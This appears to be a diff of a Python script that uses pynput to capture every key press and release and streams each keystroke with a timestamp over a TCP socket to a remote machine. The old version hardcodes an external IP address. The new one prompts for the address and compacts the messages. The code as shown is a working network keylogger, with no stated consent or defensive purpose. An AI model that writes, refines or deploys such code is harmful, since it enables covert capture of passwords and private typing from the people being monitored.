@@ -3,9 +3,9 @@ from pynput.keyboard import Key, Listener
 import logging
 from datetime import datetime
 
-ClientSocket = socket.socket()
-host = '37.152.230.38'
-port = 5006
+ClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = input("Enter the IP address")
+port = 5001
 user = input("Enter a username") 
 print('Waiting for connection')
 try:
@@ -16,17 +16,18 @@ except socket.error as e:
 
 Response = ClientSocket.recv(1024)
 
+pressed = set()
+
 def on_press(key):
-    print("{} pressed".format(key))
-    r = "User: {} pressed this key: {} at {}".format(user, key, datetime.now().time())
-    data = r.encode()
-    ClientSocket.send(data)
-    
+    if key not in pressed :
+        pressed.add(key)
+        r = "p {} {}".format(key, datetime.now().time())
+        ClientSocket.send(r.encode())
+        
 def on_release(key):
-    print("{} released".format(key))
-    r = "User: {} released this key: {} at {}".format(user, key, datetime.now().time())
-    data = r.encode()
-    ClientSocket.send(data)
+    pressed.discard(key)
+    r = "r {} {}".format(key, datetime.now().time())
+    ClientSocket.send(r.encode())
    
 with Listener(
         on_press=on_press,
